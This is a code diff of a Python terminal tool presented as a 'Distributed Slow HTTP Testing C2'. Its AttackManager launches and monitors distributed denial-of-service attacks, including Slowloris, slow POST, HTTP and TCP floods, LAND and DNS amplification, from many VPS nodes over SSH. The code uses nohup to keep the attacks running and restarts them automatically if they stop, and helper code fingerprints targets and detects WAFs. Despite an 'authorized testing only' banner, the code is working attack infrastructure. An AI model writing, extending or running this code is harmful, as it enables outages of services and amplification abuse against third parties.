+                    banner = None
+                    try:
+                        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
+                        banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
+                    except:
+                        pass
+                    
+                    # Get service name
+                    service = common_services.get(port, "unknown")
+                    
+                    # Add to results
+                    results["open_ports"].append({
+                        "port": port,
+                        "service": service,
+                        "banner": banner
+                    })
+                
+                # Close socket
+                s.close()
+                
+            except Exception as e:
+                logger.debug(f"Error scanning port {port}: {str(e)}")
+        
+        # End timer
+        end_time = time.time()
+        results["scan_time"] = end_time - start_time
+        
+        return results
+    
+    def get_ssl_info(self, target, port=443):
+        """Get SSL/TLS information for target"""
+        results = {
+            "target": target,
+            "port": port,
+            "has_ssl": False,
+            "subject": None,
+            "issuer": None,
+            "version": None,
+            "serial_number": None,
+            "not_before": None,
+            "not_after": None,
+            "is_expired": None,
+            "days_left": None,
+            "protocols": {
+                "SSLv2": False,
+                "SSLv3": False,
+                "TLSv1.0": False,
+                "TLSv1.1": False,
+                "TLSv1.2": False,
+                "TLSv1.3": False
+            },
+            "cipher_suites": [],
+            "security_checks": {
+                "heartbleed": {"pass": True, "message": ""},
+                "poodle": {"pass": True, "message": ""},
+                "freak": {"pass": True, "message": ""},
+                "logjam": {"pass": True, "message": ""},
+                "beast": {"pass": True, "message": ""},
+                "sweet32": {"pass": True, "message": ""}
+            },
+            "error": None
+        }
+        
+        try:
+            # Create socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            
+            # Connect to target
+            sock.connect((target, port))
+            
+            # Wrap with SSL
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
+            # Try to establish SSL connection
+            ssl_sock = context.wrap_socket(sock, server_hostname=target)
+            
+            # Get certificate
+            cert = ssl_sock.getpeercert(True)
+            x509 = ssl.DER_cert_to_PEM_cert(cert)
+            
+            # Mark as having SSL
+            results["has_ssl"] = True
+            
+            # Extract certificate information
+            # This is a simplified version - in a real implementation, you'd use a library like cryptography
+            # to properly parse the certificate
+            
+            # Extract subject
+            subject_start = x509.find("/CN=")
+            if subject_start != -1:
+                subject_end = x509.find("\n", subject_start)
+                results["subject"] = x509[subject_start + 4:subject_end].strip()
+            
+            # Extract issuer
+            issuer_start = x509.find("Issuer: ")
+            if issuer_start != -1:
+                issuer_end = x509.find("\n", issuer_start)
+                results["issuer"] = x509[issuer_start + 8:issuer_end].strip()
+            
+            # Extract validity
+            not_before_start = x509.find("Not Before: ")
+            if not_before_start != -1:
+                not_before_end = x509.find("\n", not_before_start)
+                results["not_before"] = x509[not_before_start + 12:not_before_end].strip()
+            
+            not_after_start = x509.find("Not After : ")
+            if not_after_start != -1:
+                not_after_end = x509.find("\n", not_after_start)
+                results["not_after"] = x509[not_after_start + 12:not_after_end].strip()
+            
+            # Check if expired
+            if results["not_after"]:
+                try:
+                    # Parse date
+                    not_after = datetime.strptime(results["not_after"], "%b %d %H:%M:%S %Y %Z")
+                    now = datetime.now()
+                    
+                    # Check if expired
+                    results["is_expired"] = now > not_after
+                    
+                    # Calculate days left
+                    days_left = (not_after - now).days
+                    results["days_left"] = days_left
+                except Exception as e:
+                    logger.debug(f"Error parsing certificate date: {str(e)}")
+            
+            # Check supported protocols
+            protocols = [
+                ("SSLv3", ssl.PROTOCOL_SSLv23),
+                ("TLSv1.0", ssl.PROTOCOL_TLSv1),
+                ("TLSv1.1", ssl.PROTOCOL_TLSv1_1),
+                ("TLSv1.2", ssl.PROTOCOL_TLSv1_2)
+            ]
+            
+            for protocol_name, protocol in protocols:
+                try:
+                    protocol_context = ssl.SSLContext(protocol)
+                    protocol_context.check_hostname = False
+                    protocol_context.verify_mode = ssl.CERT_NONE
+                    
+                    protocol_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    protocol_sock.settimeout(2)
+                    protocol_sock.connect((target, port))
+                    
+                    protocol_ssl_sock = protocol_context.wrap_socket(protocol_sock, server_hostname=target)
+                    protocol_ssl_sock.close()
+                    
+                    results["protocols"][protocol_name] = True
+                    
+                    # Security checks
+                    if protocol_name == "SSLv3":
+                        results["security_checks"]["poodle"]["pass"] = False
+                        results["security_checks"]["poodle"]["message"] = "SSLv3 is vulnerable to POODLE attack"
+                    
+                    if protocol_name in ["TLSv1.0", "TLSv1.1"]:
+                        results["security_checks"]["beast"]["pass"] = False
+                        results["security_checks"]["beast"]["message"] = f"{protocol_name} is potentially vulnerable to BEAST attack"
+                    
+                except:
+                    pass
+            
+            # Get cipher suites
+            try:
+                # This is a simplified approach - in a real implementation, you'd use a library like cryptography
+                # to properly enumerate supported cipher suites
+                cipher = ssl_sock.cipher()
+                if cipher:
+                    results["cipher_suites"].append(f"{cipher[0]} - {cipher[1]} bits - {cipher[2]}")
+                
+                # Check for weak ciphers
+                if "RC4" in str(cipher) or "DES" in str(cipher):
+                    results["security_checks"]["sweet32"]["pass"] = False
+                    results["security_checks"]["sweet32"]["message"] = "Weak cipher detected"
+            except:
+                pass
+            
+            # Close connection
+            ssl_sock.close()
+            
+        except Exception as e:
+            results["error"] = str(e)
+        
+        return results
+
+class TerminalHelper:
+    """Helper class for terminal UI operations"""
+    
+    def __init__(self):
+        """Initialize terminal helper"""
+        self.last_progress = 0
+    
+    def clear_screen(self):
+        """Clear the terminal screen"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+    
+    def print_banner(self, version):
+        """Print the application banner"""
+        banner = f"""{Colors.CYAN}{Colors.BOLD}
+╔════════════════════════════════════════════════════════════════════════════╗
+║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
+║                         ADVANCED EDITION v{version}                              ║
+╚════════════════════════════════════════════════════════════════════════════╝
+{Colors.RESET}
+{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
+{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}
+"""
+        print(banner)
+    
+    def input_with_prompt(self, prompt, required=True, validate_func=None):
+        """Get user input with validation"""
+        while True:
+            try:
+                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
+                
+                if not required and not value:
+                    return value
+                
+                if required and not value:
+                    print(f"{Colors.RED}This field is required{Colors.RESET}")
+                    continue
+                
+                if validate_func:
+                    if isinstance(validate_func, tuple):
+                        # Unpack function and error message
+                        func, error_msg = validate_func
+                        valid = func(value)
+                        if not valid:
+                            print(f"{Colors.RED}{error_msg}{Colors.RESET}")
+                            continue
+                    else:
+                        # Just a function that returns True/False
+                        valid = validate_func(value)
+                        if not valid:
+                            print(f"{Colors.RED}Invalid input{Colors.RESET}")
+                            continue
+                
+                return value
+            except KeyboardInterrupt:
+                return None
+    
+    def print_progress_bar(self, iteration, total, prefix='', suffix='', length=50, fill='█'):
+        """Print a progress bar"""
+        percent = ("{0:.1f}").format(100 * (iteration / float(total)))
+        filled_length = int(length * iteration // total)
+        bar = fill * filled_length + '-' * (length - filled_length)
+        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
+        
+        # Print New Line on Complete
+        if iteration == total:
+            print()
+    
+    def print_table(self, headers, data, padding=2):
+        """Print a formatted table"""
+        if not data:
+            return
+        
+        # Calculate column widths
+        col_widths = [len(h) for h in headers]
+        for row in data:
+            for i, cell in enumerate(row):
+                if i < len(col_widths):
+                    col_widths[i] = max(col_widths[i], len(str(cell)))
+        
+        # Add padding
+        col_widths = [w + padding for w in col_widths]
+        
+        # Print headers
+        header_row = ""
+        for i, header in enumerate(headers):
+            header_row += f"{Colors.BOLD}{header}{Colors.RESET}".ljust(col_widths[i])
+        print(header_row)
+        
+        # Print separator
+        print("-" * sum(col_widths))
+        
+        # Print data
+        for row in data:
+            row_str = ""
+            for i, cell in enumerate(row):
+                if i < len(col_widths):
+                    # Handle ANSI color codes in cell content
+                    if isinstance(cell, str) and (Colors.RED in cell or Colors.GREEN in cell or Colors.YELLOW in cell):
+                        # For colored cells, we need to account for the invisible ANSI codes
+                        visible_len = len(cell) - (len(Colors.RED) + len(Colors.RESET))
+                        row_str += f"{cell}".ljust(col_widths[i] + (len(Colors.RED) + len(Colors.RESET)))
+                    else:
+                        row_str += f"{cell}".ljust(col_widths[i])
+            print(row_str)
+    
+    def print_status(self, message, status, success_word="SUCCESS", failure_word="FAILED"):
+        """Print a status message with colored status indicator"""
+        if status:
+            status_str = f"{Colors.GREEN}{success_word}{Colors.RESET}"
+        else:
+            status_str = f"{Colors.RED}{failure_word}{Colors.RESET}"
+        
+        print(f"{message} [{status_str}]")
+    
+    def confirm_action(self, prompt):
+        """Ask for confirmation before proceeding"""
+        response = input(f"{Colors.YELLOW}{prompt} (y/N): {Colors.RESET}").strip().lower()
+        return response == 'y'
+
+class AttackManager:
+    """Manages attack operations across VPS nodes"""
+    
+    def __init__(self, ssh_manager, db_manager):
+        """Initialize attack manager with SSH and database managers"""
+        self.ssh_manager = ssh_manager
+        self.db_manager = db_manager
+        self.active_attacks = {}
+        self.monitoring_threads = {}
+    
+    def get_available_attack_methods(self):
+        """Get available attack methods"""
+        return {
+            'slowloris': 'Slowloris (Keep-Alive)',
+            'slow_post': 'R.U.D.Y (Slow POST)',
+            'slow_read': 'Slow Read',
+            'http_flood': 'HTTP Flood',
+            'ssl_exhaust': 'SSL Exhaustion',
+            'tcp_flood': 'TCP Flood',
+            'land': 'LAND Attack',
+            'dns_amplification': 'DNS Amplification'
+        }
+    
+    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
+        """Launch attack with comprehensive error handling and auto-reconnect"""
+        
+        # Parse target URL properly
+        if target_url.startswith('http'):
+            parsed = urlparse(target_url)
+            target_host = parsed.hostname or parsed.netloc
+            use_ssl = target_url.startswith('https://')
+        else:
+            target_host = target_url.split(':')[0].split('/')[0]
+            use_ssl = False
+        
+        self.active_attacks[session_id] = {
+            'target_host': target_host,
+            'target_url': target_url,
+            'attack_type': attack_type,
+            'vps_list': vps_list,
+            'status': 'running',
+            'start_time': datetime.now(),
+            'parameters': parameters,
+            'use_ssl': use_ssl
+        }
+        
+        logger.info(f"Launching {attack_type} attack on {target_host}")
+        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
+        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
+        
+        success_count = 0
+        failed_vps = []
+        
+        # Get all VPS data from database for reconnection
+        all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
+        
+        for vps_ip in vps_list:
+            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
+            
+            # Check connection status and reconnect if necessary
+            if not self.ssh_manager.get_connection_status(vps_ip):
+                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
+                
+                vps_data = all_vps_data.get(vps_ip)
+                if vps_data:
+                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
+                        vps_data['ip_address'], vps_data['username'], vps_data['password'], vps_data['ssh_port']
+                    )
+                    if reconnect_success:
+                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
+                        self.db_manager.update_vps_status(vps_ip, 'online')
+                    else:
+                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
+                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
+                        continue
+                else:
+                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
+                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
+                    continue
+            
+            # Build attack command
+            cmd = self._build_attack_command(target_url, attack_type, parameters)
+            
+            # Execute with longer timeout and better error detection
+            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
+            
+            if success:
+                print(f"{Colors.GREEN}LAUNCHED{Colors.RESET}")
+                success_count += 1
+                
+                # Start monitoring thread for this VPS
+                self._start_monitoring_thread(session_id, vps_ip)
+            else:
+                print(f"{Colors.RED}FAILED{Colors.RESET}")
+                failed_vps.append(f"{vps_ip}: {output}")
+        
+        # Update attack status in database
+        if success_count > 0:
+            self.db_manager.update_attack_status(session_id, 'running')
+            
+            # Start a thread to monitor the attack duration
+            duration = parameters.get('duration', 300)  # Default 5 minutes
+            threading.Thread(target=self._monitor_attack_duration, args=(session_id, duration), daemon=True).start()
+            
+            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
+            
+            if failed_vps:
+                print(f"\n{Colors.YELLOW}[WARNING] Failed to launch on {len(failed_vps)} VPS nodes:{Colors.RESET}")
+                for failure in failed_vps:
+                    print(f"  - {failure}")
+            
+            return True
+        else:
+            self.db_manager.update_attack_status(session_id, 'failed', json.dumps({"errors": failed_vps}))
+            print(f"\n{Colors.RED}[ERROR] Failed to launch attack on any VPS nodes{Colors.RESET}")
+            return False
+    
+    def _build_attack_command(self, target_url, attack_type, parameters):
+        """Build the attack command to execute on VPS"""
+        
+        # Base command with nohup to keep running after SSH disconnects
+        cmd = "cd ~/slowhttp_agent && nohup python3 agent.py "
+        
+        # Add target
+        cmd += f"--target &quot;{target_url}&quot; "
+        
+        # Add attack type
+        cmd += f"--attack-type {attack_type} "
+        
+        # Add common parameters
+        connections = parameters.get('connections', 100)
+        cmd += f"--connections {connections} "
+        
+        duration = parameters.get('duration', 300)
+        cmd += f"--duration {duration} "
+        
+        # Add attack-specific parameters
+        if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
+            delay = parameters.get('delay', 10)
+            cmd += f"--delay {delay} "
+        
+        if attack_type == 'http_flood':
+            requests = parameters.get('requests', 1000)
+            cmd += f"--requests {requests} "
+        
+        if attack_type == 'dns_amplification':
+            target_ip = parameters.get('target_ip')
+            if target_ip:
+                cmd += f"--target-ip {target_ip} "
+        
+        # Redirect output to log file and run in background
+        cmd += f"> attack_{attack_type}_{int(time.time())}.log 2>&1 & echo $!"
+        
+        return cmd
+    
+    def _start_monitoring_thread(self, session_id, vps_ip):
+        """Start a thread to monitor attack progress on a VPS"""
+        if session_id not in self.monitoring_threads:
+            self.monitoring_threads[session_id] = {}
+        
+        # Create and start monitoring thread
+        thread = threading.Thread(
+            target=self._monitor_attack_vps,
+            args=(session_id, vps_ip),
+            daemon=True
+        )
+        thread.start()
+        
+        self.monitoring_threads[session_id][vps_ip] = thread
+    
+    def _monitor_attack_vps(self, session_id, vps_ip):
+        """Monitor attack progress on a specific VPS"""
+        attack_info = self.active_attacks.get(session_id)
+        if not attack_info:
+            return
+        
+        # Get monitoring interval based on attack type
+        if attack_info['attack_type'] in ['slowloris', 'slow_post', 'slow_read']:
+            interval = 10  # Slower attacks need less frequent monitoring
+        else:
+            interval = 5   # Faster attacks need more frequent monitoring
+        
+        while session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
+            try:
+                # Get attack stats from VPS
+                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep"
+                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                
+                if not success or not output:
+                    # Process not found, attack might have stopped
+                    logger.warning(f"Attack process not found on {vps_ip}")
+                    
+                    # Add result with error
+                    self.db_manager.add_attack_result(
+                        session_id, vps_ip, 0, 0, 0, 1, None, None, None, 'error'
+                    )
+                    
+                    # Try to restart the attack
+                    self._attempt_restart_attack(session_id, vps_ip)
+                    
+                    # Sleep before next check
+                    time.sleep(interval)
+                    continue
+                
+                # Get CPU and memory usage
+                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
+                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                
+                cpu_usage = None
+                memory_usage = None
+                
+                if success and resource_output:
+                    parts = resource_output.strip().split()
+                    if len(parts) >= 2:
+                        try:
+                            cpu_usage = float(parts[0])
+                            memory_usage = float(parts[1])
+                        except ValueError:
+                            pass
+                
+                # Try to get attack stats from log file
+                cmd = "cd ~/slowhttp_agent && cat attack_*.log | grep -a 'Status:' | tail -1"
+                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                
+                connections_active = 0
+                packets_sent = 0
+                bytes_sent = 0
+                error_count = 0
+                response_codes = {}
+                
+                if success and stats_output:
+                    # Parse stats from output
+                    # Example: "[*] Status: 150 connections active, 1500 packets sent"
+                    try:
+                        # Extract connections
+                        conn_match = re.search(r'(\d+) connections active', stats_output)
+                        if conn_match:
+                            connections_active = int(conn_match.group(1))
+                        
+                        # Extract packets
+                        packets_match = re.search(r'(\d+) packets sent', stats_output)
+                        if packets_match:
+                            packets_sent = int(packets_match.group(1))
+                        
+                        # Extract bytes (if available)
+                        bytes_match = re.search(r'(\d+) bytes sent', stats_output)
+                        if bytes_match:
+                            bytes_sent = int(bytes_match.group(1))
+                        
+                        # Extract errors (if available)
+                        error_match = re.search(r'(\d+) errors', stats_output)
+                        if error_match:
+                            error_count = int(error_match.group(1))
+                        
+                        # Extract response codes (if available)
+                        codes_match = re.search(r'Response codes: (.*)', stats_output)
+                        if codes_match:
+                            codes_str = codes_match.group(1)
+                            code_parts = codes_str.split(', ')
+                            for part in code_parts:
+                                code, count = part.split(': ')
+                                response_codes[code] = int(count)
+                    except Exception as e:
+                        logger.error(f"Error parsing stats from {vps_ip}: {str(e)}")
+                
+                # Add result to database
+                self.db_manager.add_attack_result(
+                    session_id, vps_ip, connections_active, packets_sent, bytes_sent,
+                    error_count, cpu_usage, memory_usage, json.dumps(response_codes), 'running'
+                )
+                
+            except Exception as e:
+                logger.error(f"Error monitoring attack on {vps_ip}: {str(e)}")
+            
+            # Sleep before next check
+            time.sleep(interval)
+    
+    def _attempt_restart_attack(self, session_id, vps_ip):
+        """Attempt to restart a failed attack on a VPS"""
+        attack_info = self.active_attacks.get(session_id)
+        if not attack_info:
+            return False
+        
+        logger.info(f"Attempting to restart attack on {vps_ip}")
+        
+        # Build attack command
+        cmd = self._build_attack_command(
+            attack_info['target_url'],
+            attack_info['attack_type'],
+            attack_info['parameters']
+        )
+        
+        # Execute with longer timeout
+        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
+        
+        if success:
+            logger.info(f"Successfully restarted attack on {vps_ip}")
+            return True
+        else:
+            logger.error(f"Failed to restart attack on {vps_ip}: {output}")
+            return False
+    
+    def _monitor_attack_duration(self, session_id, duration):
+        """Monitor attack duration and stop when time is up"""
+        logger.info(f"Monitoring attack {session_id} for {duration} seconds")
+        
+        # Sleep for the duration
+        time.sleep(duration)
+        
+        # Check if attack is still active
+        if session_id in self.active_attacks and self.active_attacks[session_id]['status'] == 'running':
+            logger.info(f"Attack {session_id} duration reached, stopping")
+            self.stop_attack(session_id)
+    
+    def stop_attack(self, session_id):
+        """Stop an attack across all VPS nodes"""
+        attack_info = self.active_attacks.get(session_id)
+        if not attack_info:
+            logger.warning(f"Attack {session_id} not found")
+            return False
+        
+        logger.info(f"Stopping attack {session_id} on {len(attack_info['vps_list'])} VPS nodes")
+        print(f"\n{Colors.YELLOW}[STOPPING] Attack {session_id} on {len(attack_info['vps_list'])} VPS nodes{Colors.RESET}")
+        
+        # Update attack status
+        attack_info['status'] = 'stopping'
+        
+        # Stop attack on each VPS
+        for vps_ip in attack_info['vps_list']:
+            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
+            
+            # Kill all agent.py processes
+            cmd = "pkill -f 'python3 agent.py'"
+            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+            
+            if success:
+                print(f"{Colors.GREEN}STOPPED{Colors.RESET}")
+            else:
+                print(f"{Colors.YELLOW}FAILED{Colors.RESET}")
+        
+        # Update attack status in database
+        self.db_manager.update_attack_status(session_id, 'completed')
+        
+        # Remove from active attacks
+        if session_id in self.active_attacks:
+            del self.active_attacks[session_id]
+        
+        # Stop monitoring threads
+        if session_id in self.monitoring_threads:
+            # Threads will terminate on their own when they check active_attacks
+            del self.monitoring_threads[session_id]
+        
+        print(f"\n{Colors.GREEN}[SUCCESS] Attack {session_id} stopped{Colors.RESET}")
+        return True
+    
+    def get_attack_status(self, session_id):
+        """Get current status of an attack"""
+        attack_info = self.active_attacks.get(session_id)
+        if not attack_info:
+            # Check database for completed attacks
+            session = self.db_manager.get_attack_session(session_id)
+            if session:
+                return {
+                    'status': session['status'],
+                    'target_host': session['target_host'],
+                    'target_url': session['target_url'],
+                    'attack_type': session['attack_type'],
+                    'start_time': session['start_time'],
+                    'end_time': session['end_time']
+                }
+            return None
+        
+        # Get latest results for each VPS
+        results = self.db_manager.get_attack_results(session_id)
+        
+        # Aggregate results
+        total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
+        total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
+        total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
+        total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
+        
+        # Merge response codes
+        response_codes = {}
+        for result in results:
+            if result['response_codes']:
+                try:
+                    codes = json.loads(result['response_codes'])
+                    for code, count in codes.items():
+                        if code not in response_codes:
+                            response_codes[code] = 0
+                        response_codes[code] += count
+                except:
+                    pass
+        
+        # Calculate duration
+        start_time = attack_info['start_time']
+        duration = (datetime.now() - start_time).total_seconds()
+        
+        return {
+            'status': attack_info['status'],
+            'target_host': attack_info['target_host'],
+            'target_url': attack_info['target_url'],
+            'attack_type': attack_info['attack_type'],
+            'vps_count': len(attack_info['vps_list']),
+            'start_time': start_time.isoformat(),
+            'duration': duration,
+            'total_connections': total_connections,
+            'total_packets': total_packets,
+            'total_bytes': total_bytes,
+            'total_errors': total_errors,
+            'response_codes': response_codes
+        }
 
 class SlowHTTPTUI:
     """Terminal User Interface for SlowHTTP C2 tool with improved monitoring"""
@@ -309,6 +4008,41 @@ class SlowHTTPTUI:
         self.running = False
         print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
         sys.exit(0)
+    
+    def run(self):
+        """Main TUI loop"""
+        while self.running:
+            self.terminal.clear_screen()
+            self.terminal.print_banner(VERSION)
+            self.print_main_menu()
+            
+            try:
+                choice = input().strip()
+                
+                if choice == '1':
+                    self.vps_management_menu()
+                elif choice == '2':
+                    self.launch_attack_menu()
+                elif choice == '3':
+                    self.monitor_attacks_menu()
+                elif choice == '4':
+                    self.attack_history_menu()
+                elif choice == '5':
+                    self.network_tools_menu()
+                elif choice == '6':
+                    self.system_status_menu()
+                elif choice == '0':
+                    self._signal_handler(None, None)
+                else:
+                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                self._signal_handler(None, None)
+            except Exception as e:
+                logger.error(f"Error in main loop: {str(e)}")
+                logger.error(traceback.format_exc())
+                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+                input("Press Enter to continue...")
     
     def print_main_menu(self):
         """Print the main menu"""
@@ -633,45 +4367,30 @@ class SlowHTTPTUI:
                     success, output = self.ssh_manager.execute_command(ip, "whoami && pwd && python3 --version")
                     
                     if success:
-                        print(f"{Colors.GREEN}[SUCCESS] Command execution test passed{Colors.RESET}")
-                        print(f"Output: {output}")
-                        
-                        # Test network connectivity
-                        print(f"{Colors.CYAN}[TESTING] Network connectivity...{Colors.RESET}")
-                        success, output = self.ssh_manager.execute_command(ip, "ping -c 3 8.8.8.8 | grep 'time='")
-                        
-                        if success:
-                            print(f"{Colors.GREEN}[SUCCESS] Network connectivity test passed{Colors.RESET}")
-                            print(f"Output: {output}")
-                        else:
-                            print(f"{Colors.RED}[ERROR] Network connectivity test failed: {output}{Colors.RESET}")
-                        
-                        # Check for agent
-                        print(f"{Colors.CYAN}[CHECKING] Attack agent...{Colors.RESET}")
-                        success, output = self.ssh_manager.execute_command(ip, "ls -la /tmp/slowhttp_c2/agent.py 2>/dev/null || echo 'Not found'")
-                        
-                        if success and "Not found" not in output:
-                            print(f"{Colors.GREEN}[SUCCESS] Attack agent found{Colors.RESET}")
-                            
-                            # Test agent
-                            print(f"{Colors.CYAN}[TESTING] Attack agent...{Colors.RESET}")
-                            success, output = self.ssh_manager.execute_command(ip, "cd /tmp/slowhttp_c2 && python3 agent.py --help | head -5")
-                            
-                            if success:
-                                print(f"{Colors.GREEN}[SUCCESS] Attack agent is working{Colors.RESET}")
-                                print(f"Output: {output}")
-                            else:
-                                print(f"{Colors.RED}[ERROR] Attack agent test failed: {output}{Colors.RESET}")
-                        else:
-                            print(f"{Colors.YELLOW}[WARNING] Attack agent not found{Colors.RESET}")
+                        print(f"{Colors.GREEN}[SUCCESS] Command execution successful{Colors.RESET}")
+                        print(f"\n{Colors.BOLD}COMMAND OUTPUT:{Colors.RESET}")
+                        print(output)
                         
                         # Update status
-                        self.db_manager.update_vps_status(ip, 'online')
+                        self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
+                        
+                        # Get system info
+                        print(f"\n{Colors.CYAN}[INFO] Gathering system information...{Colors.RESET}")
+                        system_info = self.ssh_manager.get_system_info(ip)
+                        
+                        if system_info:
+                            self.db_manager.update_vps_system_info(ip, system_info)
+                            
+                            print(f"\n{Colors.BOLD}SYSTEM INFORMATION:{Colors.RESET}")
+                            for key, value in system_info.items():
+                                print(f"  {key.capitalize()}: {value}")
                     else:
-                        print(f"{Colors.RED}[ERROR] Command execution failed: {output}{Colors.RESET}")
+                        print(f"{Colors.RED}[ERROR] Command execution failed{Colors.RESET}")
+                        print(f"Error: {output}")
+                        self.db_manager.update_vps_status(ip, 'online', "Connected but command execution failed")
                 else:
                     print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
-                    self.db_manager.update_vps_status(ip, 'offline')
+                    self.db_manager.update_vps_status(ip, 'offline', f"Connection failed: {message[:100]}")
             else:
                 print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                 
@@ -679,1188 +4398,13 @@ class SlowHTTPTUI:
             print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
         except Exception as e:
             print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
+            logger.error(f"Error testing VPS: {str(e)}")
+            logger.error(traceback.format_exc())
         
         input("Press Enter to continue...")
     
-    def launch_attack_menu(self):
-        """Menu for launching attacks"""
-        self.terminal.clear_screen()
-        self.terminal.print_banner(VERSION)
-        
-        vps_list = self.db_manager.get_all_vps()
-        online_vps = [vps for vps in vps_list if vps['status'] == 'online']
-        
-        if not online_vps:
-            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
-            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
-            input("Press Enter to continue...")
-            return
-        
-        print(f"{Colors.BOLD}LAUNCH ATTACK{Colors.RESET}")
-        print("=" * 60)
-        
-        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
-        for i, vps in enumerate(online_vps, 1):
-            print(f"  {i}. {vps['ip_address']} ({vps['location'] or 'Unknown'})")
-        
-        try:
-            # Attack type selection
-            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
-            attack_methods = self.attack_manager.get_available_attack_methods()
-            
-            for i, (key, name) in enumerate(attack_methods.items(), 1):
-                print(f"{Colors.GREEN}[{i}]{Colors.RESET} {name}")
-            
-            attack_choice = self.terminal.input_with_prompt("Select attack type (1-7): ")
-            if not attack_choice or not attack_choice.isdigit():
-                return
-                
-            attack_idx = int(attack_choice) - 1
-            if attack_idx < 0 or attack_idx >= len(attack_methods):
-                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
-                input("Press Enter to continue...")
-                return
-                
-            attack_type = list(attack_methods.keys())[attack_idx]
-            attack_name = attack_methods[attack_type]
-            
-            # Target configuration
-            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
-            
-            # URL validation function
-            def validate_url(url):
-                if not url.startswith(('http://', 'https://')):
-                    url = 'http://' + url
-                try:
-                    result = urlparse(url)
-                    if all([result.scheme, result.netloc]):
-                        return True, ""
-                    return False, "Invalid URL format"
-                except:
-                    return False, "Invalid URL"
-            
-            # For DNS amplification, we need an IP address instead of a URL
-            if attack_type == 'dns_amplification':
-                target_ip = self.terminal.input_with_prompt("Target IP address: ", validate_func=self.security_manager.validate_ip)
-                if not target_ip:
-                    return
-                target_url = target_ip  # Store IP in target_url for consistency
-                target_host = target_ip
-            else:
-                target_url = self.terminal.input_with_prompt("Target URL (e.g., http://target.com): ", validate_func=validate_url)
-                if not target_url:
-                    return
-                
-                # Parse and validate target
-                if not target_url.startswith(('http://', 'https://')):
-                    target_url = 'http://' + target_url
-                
-                parsed = urlparse(target_url)
-                target_host = parsed.netloc
-                
-                # Offer to gather target information
-                print(f"\n{Colors.YELLOW}Would you like to gather information about the target first? (y/N){Colors.RESET}")
-                gather_info = input().strip().lower() == 'y'
-                
-                if gather_info:
-                    print(f"\n{Colors.CYAN}[INFO] Gathering target information...{Colors.RESET}")
-                    target_info = self.network_tools.gather_target_info(target_host)
-                    
-                    print(f"\n{Colors.BOLD}TARGET INFORMATION:{Colors.RESET}")
-                    print(f"Domain: {target_info['domain']}")
-                    print(f"IP Addresses: {', '.join(target_info['ip_addresses'])}")
-                    print(f"Web Server: {target_info['web_server'] or 'Unknown'}")
-                    print(f"WAF Detected: {Colors.RED if target_info['waf_detected'] else Colors.GREEN}{target_info['waf_detected']}{Colors.RESET}")
-                    if target_info['waf_detected']:
-                        print(f"WAF Type: {target_info['waf_type'] or 'Unknown'}")
